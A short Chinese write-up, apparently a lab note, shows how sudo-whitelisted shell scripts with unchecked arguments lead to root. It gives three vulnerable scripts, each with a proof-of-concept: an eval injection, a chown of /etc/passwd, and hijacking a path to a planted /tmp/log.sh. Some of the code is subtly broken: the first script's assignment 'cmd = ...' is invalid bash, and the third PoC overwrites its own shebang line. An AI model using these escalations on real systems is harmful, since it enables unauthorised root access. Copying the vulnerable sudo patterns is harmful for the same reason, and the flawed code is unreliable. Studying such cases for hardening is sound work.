如果sudo脚本的入参未经限制，可能引发提权问题。

# 0x00 脚本1

```shell
root: echo "aplyc1a ALL=(root) NOPASSWD:/home/aplyc1a/escal/1.sh" >> /etc/sudoers
root: chmod 755 /home/aplyc1a/escal/1.sh
```

脚本内容如下：

```shell
#!/bin/bash
set -x
if [ $1 = "aaa" ];then
    cmd = "$2 $3"
    eval $cmd
    exit $?
fi
```

poc:

```shell
aplyc1a:sudo ./1.sh aaa su -
```

# 0x01 脚本2

```shell
#!/bin/bash
set -x
if [ $1 = "aaa" ];then
    chown aplyc1a:aplyc1a $2/log.sh
fi
```

poc:

```shell
aplyc1a:sudo ./2.sh aaa "/etc/passwd "
```



# 0x02 脚本3

root在aplyc1a家目录下创建3.sh内容如下：

```shell
#!/bin/bash
${1}/log.sh
```

poc:

```shell
aplyc1a: echo "#!/bin/bash" > /tmp/log.sh
aplyc1a: echo "bash" > /tmp/log.sh
aplyc1a: chmod a+x /tmp/log.sh
aplyc1a:sudo ./3.sh "/tmp/"
```

